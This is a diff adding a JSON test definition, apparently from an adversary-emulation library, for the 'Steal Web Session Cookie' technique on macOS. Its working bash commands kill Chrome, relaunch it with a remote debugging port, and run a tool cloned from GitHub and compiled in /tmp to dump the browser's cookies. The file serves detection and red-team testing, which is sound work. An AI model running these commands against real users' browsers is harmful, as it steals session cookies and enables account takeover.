@@ -1,0 +1,37 @@
+{
+    "name": "Steal Chrome Cookies via Remote Debugging (Mac)",
+    "description": "The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.  If successful, this test will output a list of cookies.  Note: Chrome processes will be killed during this test.  See https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e",
+    "supported_platforms": [
+        "macos"
+    ],
+    "dependency_executor_name": "bash",
+    "executor": {
+        "command": "killall 'Google Chrome'\nsleep 1\nopen -a \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/\nsleep 1\n/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337",
+        "cleanup_command": "rm -rf /tmp/WhiteChocolateMacademiaNut",
+        "name": "bash",
+        "elevation_required": false,
+        "type": "Command Executor"
+    },
+    "id": "T1539",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Steal Web Session Cookie",
+    "source": "ART",
+    "uuid": "e43cfdaf-3fb8-4a45-8de0-7eee8741d072",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Install Go",
+            "prereq_command": "go version",
+            "get_prereq_command": "brew install go"
+        },
+        {
+            "description": "Download and compile WhiteChocolateMacademiaNut",
+            "prereq_command": "/tmp/WhiteChocolateMacademiaNut/chocolate -h",
+            "get_prereq_command": "git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut\ncd /tmp/WhiteChocolateMacademiaNut\ngo mod init chocolate\ngo mod tidy\ngo build"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
